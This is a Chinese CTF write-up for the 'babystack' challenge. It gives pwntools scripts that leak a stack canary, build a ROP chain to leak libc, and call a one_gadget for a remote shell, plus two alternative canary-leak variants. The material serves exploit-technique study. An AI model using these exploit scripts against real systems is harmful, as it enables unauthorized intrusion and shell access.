查看保护机制：
    Arch:           	amd64-64-little
    RELRO:      	Full RELRO
    Stack:          	Canary found
    NX:             	NX enabled
    PIE:             	No PIE (0x400000)
本题开了金丝雀，存在cookie

本题的大致代码如下：
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  memset(&s, 0, 0x80);
  while ( 1 )
  {
    puts("1.2.3...");
    if(read(0,&s,0x20)<0)
	return 1;
    v3 = atoi(&s);
	
    if ( v3 == 1 )
      read(0, &s, 0x100uLL);//strlen(s)<0x100//存在缓冲区溢出漏洞
    else if ( v3 == 2 )
    {
      puts(&s);//可将标识位拉出
      sub_400826((const char *)&unk_400AE7);
    }
    else if ( v3 == 3 )
      return 0LL;
    else
      sub_400826("invalid choice");
  }
    return 1;
}

查看缓冲区s的结构发现，总大小为090。而canary为var_8变量，在0x8的位置。
如图所示：
-0000000000000016                 db ? ; undefined
-0000000000000015                 db ? ; undefined
-0000000000000014                 db ? ; undefined
-0000000000000013                 db ? ; undefined
-0000000000000012                 db ? ; undefined
-0000000000000011                 db ? ; undefined
-0000000000000010                 db ? ; undefined
-000000000000000F                 db ? ; undefined
-000000000000000E                 db ? ; undefined
-000000000000000D                 db ? ; undefined
-000000000000000C                 db ? ; undefined
-000000000000000B                 db ? ; undefined
-000000000000000A                 db ? ; undefined
-0000000000000009                 db ? ; undefined
-0000000000000008 var_8           dq ?
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)

从上面可以看出buf距离canary的位置为0x88。

为了绕过canary机制，我们需要先想泄露canary的值，然后利用栈溢出，把这个值放到payload中对应的位置里，这样，程序发现canary的值没变，我们就成功绕过。
通过输入1，覆盖到标志位，再输入2 把表示位puts出来.可以通过将s填充满，使puts(s)时将canary泄露出来。
已知：

①canary为防止泄露，第一位已知为'\x00'
②puts()函数输出时，遇到'\x00'才停止，即使字符串中存在'\n',也会继续输出
③read函数在读取长度限制内，能够把'\n'也读进字符串中
（0）准备（注意题目给的libc与服务器给出的libc版本不一致）
#coding=UTF-8
from pwn import * 
import sys
from time import sleep
context.log_level = "debug"
# context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
#此处的exeaddr不同于以往ROPgadget找到"/bin/sh"和system函数的地址，是用onegadget直接找到execve("/bin/sh", rsp+0x30, environ)的地址，所以只需跳转到此地址即可获得shell。
#命令：one_gadget libc-2.23.so 。 OneGadget，就是直接执行 execve('/bin/sh', NULL, NULL)
    def debug():
        addr = int(raw_input("DEBUG: "), 16)
        gdb.attach(io, "b *" + str(addr))

    if sys.argv[1] == "l":
        io = process("./babystack")
        elf = ELF("./babystack")
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        exe_addr = 0x3f2d6
    else:
        io = remote("1c6a6fb.isec.anscen.cn", 1234)
        elf = ELF("./babystack")
        libc = ELF("./libc-2.23.so")
        exe_addr = 0x45216

（1）获取canary
 def getCanary():
        io.sendlineafter(">> ", "1")
        payload = cyclic(0x88)
        #  debug()
#发送0x88个padding加上'\n'。先发送0x88长度的字符串+'\n'，read函数会读进0x89个字节，并将canary第一个字节覆盖，之后puts便能将canary泄露出来。
        io.sendline(payload)
        io.sendlineafter(">> ", "2")
        sleep(1)
        io.recvuntil("\n")
        sleep(1)
        canary = u64("\x00" + io.recv(7))
        #  print hex(canary)
        log.debug("leaked canary -> 0x%x" % canary)
        return canary

（2）获得链接库地址偏移(题目已知libc的情况)
def getBase(canary):
        read_got = elf.got["read"]
        read_plt = elf.plt["read"]
        puts_plt = elf.plt["puts"]
        #  start_plt = elf.symbols["start"]
        #  start_plt = 0x400720
        start_plt = 0x400908
        pop_rdi_ret = 0x0000000000400a93
        pop_rsi_r15_ret = 0x0000000000400a91
        io.sendlineafter(">> ", "1")
        #  log.info("------------------")
#泄露链接库地址基址时，只需将canary的位置使用上一步中泄露出来的canary进行覆盖，获取链接库地址偏移和寄存器利用，详见(http://www.cnblogs.com/ZHijack/p/7900736.html)
#ret2libc尝试和(http://www.cnblogs.com/ZHijack/p/7940686.html)64位简单栈溢出。最后返回start函数，重新执行。
#命令： ROPgadget --binary babystack --only 'pop|ret' | grep 'rdi'
        payload = cyclic(0x88) + p64(canary) * 2 + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(start_plt)
        #  print len(payload)
        io.sendline(payload)
        io.sendlineafter(">> ", "3")
        #  debug()
        #  log.info("------------------")
        sleep(1)
        read_leaked = u64(io.recv(6).ljust(8, '\x00'))
        log.debug("read_leaked -> 0x%x" % read_leaked)
        read_libc = libc.symbols["read"]
        libc_base = read_leaked - read_libc
        log.debug("leaked libcBase -> 0x%x" % libc_base)
        return libc_base

（3）获取shell
def getShell(canary, libcBase):
        io.sendlineafter(">> ", "1")
        exeAddr = libcBase + exe_addr
#重新执行函数后，需重新泄露canary，然后进行溢出，即可获得shell。 
        payload = cyclic(0x88) + p64(canary) * 2 + p64(exeAddr)
        io.sendline(payload)
        #  debug()
        io.sendlineafter(">> ", "3")

        io.interactive()
        io.close()

（4）主函数执行：
if __name__ == "__main__":
        canary = getCanary()
        libcBase = getBase(canary)
        canary = getCanary()
        getShell(canary, libcBase)

虽然程序本身没有开启随机地址，但是其链接库开启了PIE保护，所以我们需要两次溢出：
先获得函数地址在libc库中的偏移，进而得到需要函数在内存中的真实地址，然后在溢出执行system函数获取shell。

writeup1：
脚本分为三个部分，结构比较清晰。





writeup2：
（这段payload直接强制记下来吧，没有看懂）
1.#0x88过后0x89开始便是canary，但由于0x89可能是0,为了利用put泄露canary，我们就先将这里覆盖为aa
2.payload='a'*(0x88)
3.
4.c=''
5.#覆盖canary的前导0
6.for i in range(0,8):
7.	sh.send(payload+'a'*i)
8.	sh.recvuntil('>>')
9.	sh.sendline('2')
10.	sh.recv(0x88+i)
11.	c=sh.recvuntil('\n').split('\n')[0]
12.#	print c
13.	l=len(c)
14.	if l>4:#长度大于我们发送的字符串长度，说明数据已经暴露出来了
15.		break;
16.	sh.recvuntil('>>')
17.	sh.sendline('1')
18.#print c
19.#补齐8字节
20.for j in range(0,i):
21. c='\x00'+c
22.
23.#取前8字节数据，这才是canary
24.c=c[0:8]
得到了canary，我们就可以进行栈溢出ROP操作了


此writeup有困扰我很久的问题的题解：（查找rdi问题）
为了将数据放入 rdi 寄存器，我们需要找到一条 pop rdi 的指令，我们不能把指令写在栈里，因为开启了栈不可执行保护。我们发现了，在 IDA 中搜索 pop，我们发现了这里可以被我们利用
我们选择 pop r15，选择 undefine
然后选择下面的两字节数据，选择 Code
就出现了 pop rdi 指令,这是一种巧妙的方法，类似的，我们可以对 r14,r13 操作，获
得其他相关指令，它的地址为 0x400A93，并且过后还有一个 retn，我们完全可以把这里看
成是一个函数的开始
这个writeup应为最符合做法的一个


writeup3：
#GET CANARY
payload = 'a' * 0x88
signal = '95279527'
payload = payload[:-len(signal)] + signal

conn.sendlineafter('>> ', '1')
conn.sendline(payload)

conn.sendlineafter('>> ', '2')
conn.recvuntil(signal + '\n')

'''
    if we use sendline
    then there's an extra '\n' byte
'''

canary = u64(conn.recv(7).rjust(8, '\x00'))

log.info('Canary Found: %s' % hex(canary))
